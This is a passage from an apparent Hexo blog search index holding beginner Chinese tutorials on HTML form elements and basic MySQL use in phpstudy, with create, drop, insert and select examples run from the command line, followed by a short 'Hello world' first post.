id="（3）文件上传："><a href="#（3）文件上传：" class="headerlink" title="（3）文件上传："></a>（3）文件上传：</h5><pre><code class="html">    &lt;input type=&quot;file&quot; /&gt;</code></pre><h5 id="（4）隐藏的input："><a href="#（4）隐藏的input：" class="headerlink" title="（4）隐藏的input："></a>（4）隐藏的input：</h5><pre><code class="html">    &lt;input type=&quot;hidden&quot; /&gt;</code></pre><h5 id="（5）普通按钮："><a href="#（5）普通按钮：" class="headerlink" title="（5）普通按钮："></a>（5）普通按钮：</h5><pre><code class="html">    &lt;input type=&quot;button&quot; /&gt;</code></pre><h5 id="（6）单选："><a href="#（6）单选：" class="headerlink" title="（6）单选："></a>（6）单选：</h5><pre><code class="html">&lt;input type=&quot;radio&quot; /&gt;  &lt;!--通过相同name属性实现单选--&gt;</code></pre><p>实例</p><pre><code class="html">      &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女</code></pre><h5 id="（7）复选框："><a href="#（7）复选框：" class="headerlink" title="（7）复选框："></a>（7）复选框：</h5><pre><code class="html">    &lt;input type=&quot;checkbox&quot; /&gt;</code></pre><h5 id="（8）提交："><a href="#（8）提交：" class="headerlink" title="（8）提交："></a>（8）提交：</h5><pre><code class="html">    &lt;input type=&quot;submit&quot; /&gt;</code></pre><h5 id="（9）重置："><a href="#（9）重置：" class="headerlink" title="（9）重置："></a>（9）重置：</h5><pre><code class="html">    &lt;input type=&quot;reset&quot; /&gt;</code></pre><p>属性placeholder 可用值text：规定帮助用户填写输入字段提示<br>属性checked 可用值checked：用于选择页面（单复选），实现默认选择<br>属性disabled 可用值disabled：使标签不可用<br>属性name：给input输入界面起名字<br>属性readonly 可用值readonly ：使输入界面为只读状态<br>属性size   值为数字：设置输入框长度<br>属性value：该属性值为input提交到页面的数据，可通过该属性设置默认值</p><h4 id="3、textarea标签：定义多行输入框"><a href="#3、textarea标签：定义多行输入框" class="headerlink" title="3、textarea标签：定义多行输入框"></a>3、textarea标签：定义多行输入框</h4><pre><code class="html">    &lt;!--双标签，默认值写标签之间--&gt;</code></pre><p>属性cols  值为数字<br>属性rows  值为数字<br>也可使用disabled  name  readonly属性<br>实例</p><pre><code class="html">    自我介绍：&lt;textarea cols=&quot;20&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;</code></pre><h4 id="4、label标签：提升用户体验"><a href="#4、label标签：提升用户体验" class="headerlink" title="4、label标签：提升用户体验"></a>4、label标签：提升用户体验</h4><p>标签for属性与input的id属性相同</p><h4 id="5、select标签：配合option实现下拉菜单"><a href="#5、select标签：配合option实现下拉菜单" class="headerlink" title="5、select标签：配合option实现下拉菜单"></a>5、select标签：配合option实现下拉菜单</h4><p>可用属性：disabled  name  multiple</p><pre><code class="html">    &lt;select&gt;    ​    &lt;option&gt;&lt;/option&gt;    &lt;/select&gt;</code></pre><h4 id="6、option标签"><a href="#6、option标签" class="headerlink" title="6、option标签"></a>6、option标签</h4><p>可用属性：disabled  select  value</p><h4 id="7、optgroup标签"><a href="#7、optgroup标签" class="headerlink" title="7、optgroup标签"></a>7、optgroup标签</h4><pre><code class="html">    &lt;!--把相关选项组合在一起--&gt;</code></pre><p>属性label：给选项组命名<br>属性disabled：停用该选项组<br>实例</p><pre><code class="html">       &lt;select&gt;            &lt;optgroup label=&quot;河南省&quot;&gt;            ​    &lt;option value=&quot;周口&quot;&gt;周口&lt;/option&gt;                &lt;option&gt;郑州&lt;/option&gt;                &lt;option&gt;洛阳&lt;/option&gt;            &lt;/optgroup&gt;        &lt;/select&gt;</code></pre><h4 id="表单提交实例2"><a href="#表单提交实例2" class="headerlink" title="表单提交实例2"></a>表单提交实例2</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;    &lt;link rel=&quot;icon&quot; href=&quot;../../favicon.ico&quot;&gt;    &lt;title&gt;表单提交练习&lt;/title&gt;    &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; /&gt;    &lt;link href=&quot;../../assets/css/ie10-viewport-bug-workaround.css&quot; rel=&quot;stylesheet&quot; /&gt;    &lt;link href=&quot;signin.css&quot; rel=&quot;stylesheet&quot; /&gt;    &lt;script src=&quot;../../assets/js/ie-emulation-modes-warning.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class=&quot;container&quot;&gt;      &lt;form class=&quot;form-signin&quot; name=&quot;submit&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt;        &lt;h2 class=&quot;form-signin-heading&quot;&gt;表单提交&lt;/h2&gt;        &lt;input type=&quot;text&quot; id=&quot;inputText&quot; class=&quot;form-control&quot; placeholder=&quot;text&quot; /&gt;        &lt;br /&gt;        &lt;input type=&quot;password&quot; id=&quot;inputPassword&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; /&gt;        &lt;br /&gt;        &lt;input class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; value=&quot;立即提交&quot; /&gt;      &lt;/form&gt;    &lt;/div&gt;    &lt;script src=&quot;../../assets/js/ie10-viewport-bug-workaround.js&quot;&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web前端 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy-MySQL的简单使用以及cmd打开MySQL</title>
      <link href="/2019/03/15/phpstudy-MySQL%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B8%80/"/>
      <url>/2019/03/15/phpstudy-MySQL%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>今天尝试学习使用phpstudy中的mysql，让我受益颇深。所以把学习和练习过程记录了一下，<strong>首先是数据库的创建，其次是在MySQL命令行对数据增、删、改、查的练习，最后是用cmd打开phpstudy中的MySQL，以及增删改查练习</strong>。要注意的是，phpstudy中默认账户密码都是root，只在文件中把密码改了是没有用的。<br>在此之前，我们需要了解一下什么是数据库和mysql。<br><strong><em>数据库就是存储数据的仓库，其本质是一个文件系统，数据按照特定的格式将数据存储起来，用户可以对数据库中的数据进行增加，修改，删除及查询操作。</em></strong><br><strong><em>mysql是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，提高了灵活性。使用的语言是SQL语言。</em></strong></p><h1 id="1、创建数据库"><a href="#1、创建数据库" class="headerlink" title="1、创建数据库"></a>1、创建数据库</h1><h3 id="（1）打开MySQL-Front"><a href="#（1）打开MySQL-Front" class="headerlink" title="（1）打开MySQL-Front"></a>（1）打开MySQL-Front</h3><p><img src="http://img-blog.csdnimg.cn/20190123193244146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现这里自带前端可视化界面。然后我开始对数据库进行创建。</p><h3 id="（2）创建、删除数据库"><a href="#（2）创建、删除数据库" class="headerlink" title="（2）创建、删除数据库"></a>（2）创建、删除数据库</h3><p>首先，创建一个数据库名为mydata的数据库（或者是在MySQL命令行中输入<code>create database 数据库名称；</code>）<br><img src="http://img-blog.csdnimg.cn/20190123213642123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="sql">mysql&gt; create database mydata;Query OK, 1 row affected (0.01 sec)</code></pre><p>如果删除该数据库，在这里可进行删除（或者是在MySQL命令行中输入<code>drop database 数据库名称；</code>）<br><img src="http://img-blog.csdnimg.cn/20190123211728486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="sql">mysql&gt; drop database mydata;Query OK, 0 rows affected (0.00 sec)</code></pre><h3 id="（3）创建、删除数据表"><a href="#（3）创建、删除数据表" class="headerlink" title="（3）创建、删除数据表"></a>（3）创建、删除数据表</h3><p>创建一个数据表名为users的数据表格（或者是在MySQL命令行中输入<code>create table 表名 ( id int ,name varchar(35),password varchar(40));</code> 其中 id name password 是字段 ,后面的限制是类型。）<br><img src="http://img-blog.csdnimg.cn/20190123213436198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="sql">mysql&gt; use mydata;Database changedmysql&gt; create table users(Id int,text varchar(35),password varchar(40));Query OK, 0 rows affected (0.01 sec)</code></pre><p>如果删除该数据表，在这里可进行删除（或者是在MySQL命令行中输入<code>drop table 表名；</code>）<br><img src="http://img-blog.csdnimg.cn/20190123213858623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code class="sql">mysql&gt; drop table users;Query OK, 0 rows affected (0.00 sec)</code></pre><p>然后类似的，再进行字段的创建。创建好之后，由对象浏览器转换到数据浏览器，输入相关数据就完整创建了一个数据库。如下：<br><img src="http://img-blog.csdnimg.cn/20190123221402438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="2、通过MySQL命令行对数据增、删、改、查"><a href="#2、通过MySQL命令行对数据增、删、改、查" class="headerlink" title="2、通过MySQL命令行对数据增、删、改、查"></a>2、通过MySQL命令行对数据增、删、改、查</h1><p>首先，打开MySQL命令行，输入默认密码root<br><img src="http://img-blog.csdnimg.cn/20190123220044127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="（1）选择数据库"><a href="#（1）选择数据库" class="headerlink" title="（1）选择数据库"></a>（1）选择数据库</h3><p>选择使用哪个数据库，这里选择使用的是mydata数据库 </p><pre><code class="sql">mysql&gt; use mydata;Database changed</code></pre><h3 id="（2）数据的增、删、改、查"><a href="#（2）数据的增、删、改、查" class="headerlink" title="（2）数据的增、删、改、查"></a>（2）数据的增、删、改、查</h3><h4 id="1-增"><a href="#1-增" class="headerlink" title="1.增"></a>1.增</h4><p>原先，没有“<code>id=6，text=‘qwzf’，password=‘qwzf’</code>”这条记录，通过sql语句在数据库的表格中添加了这条记录。（或者是<code>alter table 表名 add 字段名称+字段类型；</code>）<br><img src="http://img-blog.csdnimg.cn/20190123221826135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-删"><a href="#2-删" class="headerlink" title="2.删"></a>2.删</h4><pre><code class="sql">    mysql&gt; delete from users where id=5;    Query OK, 1 row affected (0.00 sec)</code></pre><p>这里删除了在表格users中id=5的那条记录。（或者是<code>alter table 表名  drop 字段名字；</code>）</p><h4 id="3-改"><a href="#3-改" class="headerlink" title="3.改"></a>3.改</h4><p>如果要改表名，则在MySQL命令行输入<code>alter table 原表名 rename 新的名字；</code><br>如果要修改字段，则在MySQL命令行输入<code>alter table 表名  change 原来的字段名称    修改后的字段名称；</code>（或者是<code>update 表名 set 字段=‘数据’ where 范围;</code>）在id=4的那条记录中，字段text下的数据“php”被更新修改成“him”<br><img src="http://img-blog.csdnimg.cn/20190123222620977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="4-查"><a href="#4-查" class="headerlink" title="4.查"></a>4.查</h4><h6 id="1-查库"><a href="#1-查库" class="headerlink" title="1.查库"></a>1.查库</h6><p>在命令行想看所有的数据库，这就用到了<code>show databases；</code>（注意：在mysql语句中，一句话写完必须加分号。且mysql语句中不区分大小写）</p><pre><code class="sql">    mysql&gt; show databases;    +--------------------+    | Database           |    +--------------------+    | information_schema |    | mydata             |    | myl                |    | myphp              |    | myphp2             |    | mysql              |    | performance_schema |    | test               |    +--------------------+    8 rows in set (0.01 sec)</code></pre><h6 id="2-查表"><a href="#2-查表" class="headerlink" title="2.查表"></a>2.查表</h6><p>在命令行想看mydata数据库中所有表，这就用到了<code>show tables；</code></p><pre><code class="sql">     mysql&gt; show tables;        +------------------+        | Tables_in_mydata |        +------------------+        | users            |        +------------------+        1 row in set (0.00 sec)</code></pre><p>在命令行想看users表中所有数据，这就用到了<code>select*from 表名；</code></p><pre><code class="sql">    mysql&gt; select*from users;    +----+-------+----------+    | Id | text  | password |    +----+-------+----------+    |  1 | admin | admin    |    |  2 | root  | root     |    |  3 | wang  | wang     |    |  4 | him   | php      |    |  6 | qwzf  | qwzf     |    +----+-------+----------+    5 rows in set (0.00 sec)</code></pre><h6 id="3-查字段"><a href="#3-查字段" class="headerlink" title="3.查字段"></a>3.查字段</h6><p>在命令行想看users表中在一定范围的字段,<code>select*from 表名 where 范围；</code></p><pre><code class="sql">    mysql&gt; select*from users where id=1;    +----+-------+----------+    | Id | text  | password |    +----+-------+----------+    |  1 | admin | admin    |    +----+-------+----------+    1 row in set (0.00 sec)    mysql&gt; select*from users where text=&#39;qwzf&#39;;    +----+------+----------+    | Id | text | password |    +----+------+----------+    |  6 | qwzf | qwzf     |    +----+------+----------+    1 row in set (0.00 sec)    mysql&gt; select*from users where password=&#39;wang&#39;;    +----+------+----------+    | Id | text | password |    +----+------+----------+    |  3 | wang | wang     |    +----+------+----------+    1 row in set (0.00 sec)</code></pre><h6 id="4-查看表结构"><a href="#4-查看表结构" class="headerlink" title="4.查看表结构"></a>4.查看表结构</h6><p>在命令行想看users表的表结构，用<code>desc 表名；</code></p><pre><code class="sql">    mysql&gt; desc users;    +----------+--------------+------+-----+---------+----------------+    | Field    | Type         | Null | Key | Default | Extra          |    +----------+--------------+------+-----+---------+----------------+    | Id       | int(11)      | NO   | PRI | NULL    | auto_increment |    | text     | varchar(255) | YES  |     | NULL    |                |    | password | varchar(255) | YES  |     | NULL    |                |    +----------+--------------+------+-----+---------+----------------+    3 rows in set (0.00 sec)</code></pre><h1 id="3、用cmd打开phpstudy中的MySQL"><a href="#3、用cmd打开phpstudy中的MySQL" class="headerlink" title="3、用cmd打开phpstudy中的MySQL"></a>3、用cmd打开phpstudy中的MySQL</h1><p>首先，打开cmd命令行页面。如果计算机是Windows10操作系统，输入Windows+R，打开windows运行搜索框，输入cmd回车，打开cmd命令行页面。然后在电脑上找到phpstudy所在目录。<br><strong>1.返回上一级目录cd\  2.进入下一级目录cd+空格+目录名</strong><br>下面是我在cmd命令行中打开phpstudy中MySQL的过程：</p><pre><code class="sql">    C:\Users\ASUS&gt;cd\      // 返回上一级目录    C:\&gt;cd phpstudy           //进入下一级目录    C:\phpStudy&gt;cd PHPTutorial    C:\phpStudy\PHPTutorial&gt;cd MySQL    C:\phpStudy\PHPTutorial\MySQL&gt;cd bin    C:\phpStudy\PHPTutorial\MySQL\bin&gt;mysql -u root -p    Enter password: ****    Welcome to the MySQL monitor.  Commands end with ; or \g.    Your MySQL connection id is 4    Server version: 5.5.53 MySQL Community Server (GPL)    Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.    Oracle is a registered trademark of Oracle Corporation and/or its    affiliates. Other names may be trademarks of their respective    owners.    Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.    mysql&gt;</code></pre><p>用cmd打开mysql后，增、删、改、查过程与直接在phpstudy通过MySQL命令行对数据增、删、改、查，过程相同。<strong>可参照上面的直接通过MySQL命令行对数据增、删、改、查过程</strong>。本人小白一枚，如有个别错误，敬请大佬指正。</p>]]></content>
      
      
      <categories>
          
          <category> 工具学习 </category>
          
          <category> phpstudy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello world</title>
      <link href="/2019/03/12/hello-world/"/>
      <url>/2019/03/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p><strong>第一篇</strong><br>第一次搭这个Hexo个人博客，忙了许久，总算搭好了。在搭的过程中，竟然没有踩坑，真好。</p><p>于是我便迫不及待的先写下这个 blog试试效果怎么样。</p><p>现在看起来效果还不错，希望我能再接再厉，努力学习，并且写出好的blog。从现在开始我的小白进阶之旅！！！</p>]]></content>
      
      
      <categories>
          
          <category> First </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
